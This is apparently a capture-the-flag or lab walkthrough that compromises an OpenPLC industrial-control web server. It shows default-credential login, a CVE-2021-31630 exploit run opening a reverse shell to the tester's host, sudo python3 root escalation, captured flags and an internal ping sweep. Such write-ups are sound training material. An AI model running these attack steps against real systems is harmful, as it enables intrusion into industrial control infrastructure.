As usual I will start by checking for all the alive services over all the TCP protocol:

```bash
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 64 OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 9a:87:07:c6:bf:b1:2a:17:ed:3e:f1:83:a7:06:82:f8 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDdjkpOpM7WQdyGVnvOpucgUxiIb0NIOyxrTve+gi0MnOJJNxAuiqbp2JdMbxg0NVh7/pFP4nOSbgpaoAw0oAYIObo75B+mPUwWZfzhv1eo9MBJmrNd8e5RRF1ReUBfBBZQ/tcptO4mIE3wzxW8JFtaJSG1jyJE+N+F/yLR7m4ezGZZ7jldGQjv+s80X686aMYDqhwpQfHxfDKJLymPxqvvZGihdKsEsL76Ar1rt+dXh54oS6jxN7nyysR2XiBX7Nrt3FTdQKq9R8Lcm27jaCjSt19OUAPiodFdRI0url+zlBQMsdC33tTFLmFU5hMPuqKOysXnWWzauBIgdCLjvhK8tGVUXOhu6iyaNAojAo8kfHeYEyQhiGM38rfIQsFLz1QOB5ThjOort0iESZj1mgwTNmF6ARYygcxbmZ8n0xZjV7fiag5p+l/MGae9hlpcEVBHrMq8l2uEylF1NP3PVoyctRumyU3c8Z8Tyxc8HsZoi/UAJhf0M76kYz0xo/KnAmM=
|   256 b2:9b:a6:04:75:21:49:0d:89:9d:31:f3:e1:f2:28:0b (ECDSA)
|_ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBELSpLWd0V5/uw9A7YeqVHXfpq2he6zyy00ZksGP4ogP3rSruETrfqaRPYBzV8XzHsffMryurwH1fkLtCopusV8=
8080/tcp open  http    syn-ack ttl 64 Werkzeug httpd 1.0.1 (Python 2.7.18)
| http-title: Site doesn't have a title (text/html; charset=utf-8).
|_Requested resource was http://172.16.0.3:8080/login
| http-methods: 
|_  Supported Methods: HEAD OPTIONS GET
|_http-server-header: Werkzeug/1.0.1 Python/2.7.18
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: IBM z/OS 1.11 (86%), IBM OS/2 Warp 2.0 (86%), IBM z/OS 2.1 (86%), Dell PowerConnect 3348 switch (86%), IBM z/OS 1.10 (85%), IBM OS/390 V2 (85%), HP OpenVMS 7.3 - 8.3 (85%), Dell PowerConnect 3324 switch (85%), Radware LinkProof load balancer (85%), FreeNAS 0.69RC2 (FreeBSD 6.4-RELEASE) (85%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.99%E=4%D=4/20%OT=22%CT=%CU=%PV=Y%G=N%TM=69E620F1%P=x86_64-pc-linux-gnu)
SEQ(SP=101%GCD=1%ISR=10F%TI=I%CI=I%II=I%TS=A)
SEQ(SP=103%GCD=1%ISR=10F%TI=I%CI=I%II=RI%TS=A)
OPS(O1=M5B4NNT11NW7%O2=M5B4NNT11NW7%O3=M5B4NNT11NW7%O4=M5B4NNT11NW7%O5=M5B4NNT11NW7%O6=M5B4NNT11)
WIN(W1=7200%W2=7200%W3=7200%W4=7200%W5=7200%W6=7200)
ECN(R=Y%DF=N%TG=40%W=7200%O=M5B4NW7%CC=N%Q=)
T1(R=Y%DF=N%TG=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=Y%DF=N%TG=40%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)
T3(R=Y%DF=N%TG=40%W=7200%S=O%A=S+%F=AS%O=M5B4NNT11NW7%RD=0%Q=)
T4(R=Y%DF=N%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T5(R=Y%DF=N%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=Y%DF=N%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T7(R=Y%DF=N%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
U1(R=N)
IE(R=Y%DFI=S%TG=40%CD=S)

Uptime guess: 40.701 days (since Tue Mar 10 21:00:04 2026)
TCP Sequence Prediction: Difficulty=257 (Good luck!)
IP ID Sequence Generation: Incrementing by 2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

# OPENPlc

Now I googled a bit and apparently these are the default credentials on this machine:  
![21e52a28565ce8100a269c9200899165.png](../../../_resources/21e52a28565ce8100a269c9200899165.png)

And I am in:

![3e82ac244e4382281fd2c6329ac1dda0.png](../../../_resources/3e82ac244e4382281fd2c6329ac1dda0.png)

And a quick googling seems like there is [another](https://www.exploit-db.com/exploits/49803) ready exploit to be used?

```bash
python3 openplc_exploit.py -u http://172.16.0.3:8080 -l openplc -p openplc -i 10.10.14.15 -r 4444
[+] Remote Code Execution on OpenPLC_v3 WebServer
[+] Checking if host http://172.16.0.3:8080 is Up...
[+] Host Up! ...
[+] Trying to authenticate with credentials openplc:openplc
[+] Login success!
[+] PLC program uploading... 
[+] Attempt to Code injection...
[+] Spawning Reverse Shell...
[+] Failed to receive connection :(
                                     
```

But the program fais, what if the issue is that this machine cannot talk back to me? Edit: it is not working even on the machine on the adiacent subnet so the issue must be somewhere other.

&nbsp;But then I tried another exploit and [this](https://raw.githubusercontent.com/thewhiteh4t/cve-2021-31630/refs/heads/main/cve_2021_31630.py) worked as expected:

```bash
nc -lnvp 4444           
listening on [any] 4444 ...
connect to [10.10.14.15] from (UNKNOWN) [10.10.110.1] 52659
bash: cannot set terminal process group (676): Inappropriate ioctl for device
bash: no job control in this shell
openplc@web02:/opt/PLC/OpenPLC_v3/webserver$ id
id
uid=1000(openplc) gid=1000(openplc) groups=1000(openplc)
openplc@web02:/opt/PLC/OpenPLC_v3/webserver$ hostname
hostname
web02
openplc@web02:/opt/PLC/OpenPLC_v3/webserver$ ip a
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
2: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:94:12:dc brd ff:ff:ff:ff:ff:ff
    altname enp11s0
    inet 172.16.0.3/24 brd 172.16.0.255 scope global ens192
       valid_lft forever preferred_lft forever
3: ens224: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:94:b0:81 brd ff:ff:ff:ff:ff:ff
    altname enp19s0
    inet 172.17.0.3/24 brd 172.17.0.255 scope global ens224
       valid_lft forever preferred_lft forever
openplc@web02:/opt/PLC/OpenPLC_v3/webserver$ 

```

# Road to Root

Now I will start by getting another flag from this machine and at the same time I will add my current user's RSA private key in order to get a better login.

```bash
openplc@web02:~$ ls -al
ls -al
total 24
drwxr-xr-x 2 openplc openplc 4096 Apr 10  2024 .
drwxr-xr-x 3 root    root    4096 Mar 12  2024 ..
lrwxrwxrwx 1 openplc openplc    9 Mar 12  2024 .bash_history -> /dev/null
-rw-r--r-- 1 openplc openplc  220 Aug  4  2021 .bash_logout
-rw-r--r-- 1 openplc openplc 3526 Aug  4  2021 .bashrc
-rw-r--r-- 1 root    root      45 Mar 12  2024 flag.txt
-rw-r--r-- 1 openplc openplc  807 Aug  4  2021 .profile
openplc@web02:~$ cat flag.txt
cat flag.txt
ALCHEMY{c3L357I4l_KIn9D0M_n33d_fUnd5_n0_m0r3}
openplc@web02:~$ 

```

Now a quick check shows that the user is cabable of spawning python3 as sudo? Bonkers!

```bash
openplc@web02:~$ sudo -l
Matching Defaults entries for openplc on web02:
    env_reset, mail_badpass, secure_path=/opt/jdk-11/bin\:/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User openplc may run the following commands on web02:
    (ALL : ALL) NOPASSWD: /usr/bin/python3
openplc@web02:~$ 

```

And so easily I can spawn a shell as root on this machine:

```bash
openplc@web02:/tmp$ sudo python3 
Python 3.9.2 (default, Feb 28 2021, 17:03:44) 
[GCC 10.2.1 20210110] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import os; os.execl("/bin/sh", "sh")
# id
uid=0(root) gid=0(root) groups=0(root)
# hostname
web02
# 


```

And get the root flag:

```bash
# cd /root
# ls
flag.txt
# ls -al
total 36
drwx------  4 root root 4096 Apr 21 04:38 .
drwxr-xr-x 18 root root 4096 Apr 10  2024 ..
drwx------  3 root root 4096 Apr 10  2024 .ansible
lrwxrwxrwx  1 root root    9 May 20  2022 .bash_history -> /dev/null
-rw-r--r--  1 root root  571 Apr 10  2021 .bashrc
drwxr-xr-x  3 root root 4096 Apr 10  2024 .cache
-rw-r--r--  1 root root   34 Mar 13  2024 flag.txt
-rw-r--r--  1 root root  161 Jul  9  2019 .profile
-rw-------  1 root root  295 Apr 21 04:38 .python_history
-rw-r--r--  1 root root  173 Mar 12  2024 .wget-hsts
# cat flag.txt	
ALCHEMY{7H3_M4K1N9_0F_4_m0N4rcHY}
# 

```

# Post Exploitation

Here I was curious and apparently there is a machine I missed to enumerate from the SCADA machine:

```bash
root@web02:/opt/PLC/OpenPLC_v3/webserver# for i in {1..254} ;do (ping 172.17.0.$i -c 1 -w 5  >/dev/null && echo "172.17.0.$i" &) ;done
172.17.0.3
172.17.0.1
172.17.0.10
172.17.0.34
172.17.0.50
172.17.0.11
root@web02:/opt/PLC/OpenPLC_v3/webserver# 

```

&nbsp;